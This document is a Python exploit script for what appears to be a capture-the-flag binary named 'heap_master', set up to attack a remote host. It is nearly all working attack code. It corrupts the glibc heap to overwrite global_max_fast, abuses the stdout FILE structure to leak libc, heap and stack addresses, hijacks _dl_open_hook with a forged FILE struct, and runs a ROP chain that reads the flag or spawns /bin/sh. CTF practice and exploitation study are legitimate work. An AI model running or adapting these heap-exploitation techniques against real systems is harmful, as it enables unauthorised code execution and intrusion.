#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './heap_master'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'rlocal', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', rlocal = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        rlocal  = {'argv':['./ld-linux-x86-64.so.2', bin_file], 'env':{'LD_PRELOAD':'./libc.so.6'}}, \
                        remote  = {'host':'34.92.96.238', 'port':60001})
                        # remote  = {'host':'192.168.44.136', 'port':60001})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        rlocal  = 'libc.so.6', \
                        remote  = 'libc.so.6')
env.select('remote')

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
if env.check('debug'):
    libc.address = 0x7ffff7a0d000

offset_libc_free_hook  = libc.symbols['__free_hook'] 
offset_libc_max_fast   = offset_libc_free_hook + (0x50 if env.libc is None else 0x48)
offset_libc_stdout     = libc.symbols['_IO_2_1_stdout_']

#==========

def attack(conn, **kwargs):
    hm = HeapMaster(conn)

    hm.edit(0x8, p64(0x91))
    hm.edit(0x98, p64(0x21))
    hm.edit(0xb8, p64(0x21))

    hm.free(0x10)
    hm.edit(0x18, p16((offset_libc_max_fast-0x10) & ((1<<16)-1)))
    hm.malloc(0x88)

    hm.edit(0x8, p64(0xf1))
    hm.edit(0xf8, p64(0x11))
    hm.free(0x10)
    hm.edit(0x8, p64(0x91))
    hm.edit(0x18, p16((offset_libc_stdout+0x10-0x10) & ((1<<16)-1)))
    hm.malloc(0x88)

    hm.wait = False

    hm.edit(0x8, p64(0xf1))
    hm.free(0x10)
    hm.edit(0x8, p64(0x91))
    hm.edit(0x18, p16((offset_libc_stdout+0x20-0x10) & ((1<<16)-1)))
    hm.malloc(0x88)

    addr_heap_base  = u64(conn.recv(8)) - 0x20
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    conn.recv(8)
    addr_buf_base   = u64(conn.recv(8))
    info('addr_buf_base     = 0x{:08x}'.format(addr_buf_base))

    addr_libc_stdout    = u64(conn.recv(8)) - 0x10
    if not env.check('debug'):
        libc.address = addr_libc_stdout - offset_libc_stdout
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_gets          = libc.sep_function['gets']
    addr_libc_stdout        = libc.symbols['_IO_2_1_stdout_']
    addr_libc_dl_open_hook  = libc.symbols['_dl_open_hook']
    addr_libc_io_file_jumps = libc.symbols['_IO_file_jumps']
    addr_libc_io_str_jumps  = addr_libc_io_file_jumps + 0xc0

    conn.recv(0x838)
    addr_stack      = u64(conn.recv(8)) & ~0xf
    info('addr_stack        = 0x{:08x}'.format(addr_stack))

    hm.wait = True

    hm.edit(0x8, p64(0xf1))
    hm.free(0x10)
    hm.edit(0x8, p64(0x91))
    hm.edit(0x18, p64(addr_libc_dl_open_hook-0x10))
    hm.malloc(0x88)

    hm.edit(0x8, p64(0xf1))
    hm.free(0x10)
    hm.edit(0x8, p64(0x91))
    hm.edit(0x18, p64(addr_libc_stdout+0x68-0x10))
    hm.malloc(0x88)

    hm.edit(0x8, p64(0x191))
    hm.edit(0x198, p64(0x11))
    hm.free(0x10)

    fake_file  = '\x00'*0x28
    fake_file += p64((addr_stack-0x2000 - 0x64)/2 + 1)
    fake_file  = fake_file.ljust(0x40, '\x00')
    fake_file += p64((addr_stack-0x2000 - 0x64)/2)
    fake_file  = fake_file.ljust(0xd8, '\x00')
    fake_file += p64(addr_libc_io_str_jumps)
    fake_file += p64(addr_libc_gets)
    hm.edit(0, fake_file)

    yn = raw_input('shell? (Y/n) >> ') if not env.check('remote') else 'n'
    rop = ROP(libc)
    if 'n' in yn.lower():
        hm.edit(0x100, './flag\x00')
        rop.open(addr_buf_base + 0x100, 0)
        rop.read(3, addr_buf_base + 0x200, 0x100)
        rop.write(constants.STDOUT_FILENO, addr_buf_base + 0x200, 0x100)
    else:
        hm.edit(0x100, '/bin/sh\x00')
        rop.execve(addr_buf_base + 0x100, 0, 0)

    conn.sendlineafter('>> ', '0')
    conn.sendline(p64(rop.ret.address)*0x300+str(rop))

class HeapMaster:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter
        self.wait           = True

    def malloc(self, size):
        if self.wait:
            self.sendlineafter('>> ', '1')
            self.sendlineafter('size: ', str(size))
        else:
            self.sendline('1')
            self.sendline(str(size))

    def edit(self, offset, content):
        if self.wait:
            self.sendlineafter('>> ', '2')
            self.sendlineafter('offset: ', str(offset))
            self.sendlineafter('size: ', str(len(content)))
            self.sendafter('content: ', content)
        else:
            self.sendline('2')
            self.sendline(str(offset))
            self.sendline(str(len(content)))
            self.send(content)

    def free(self, offset):
        if self.wait:
            self.sendlineafter('>> ', '3')
            self.sendlineafter('offset: ', str(offset))
        else:
            self.sendline('3')
            self.sendline(str(offset))
 
#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.bruteforce(attack)
    comn.connection.interactive()
    
#==========
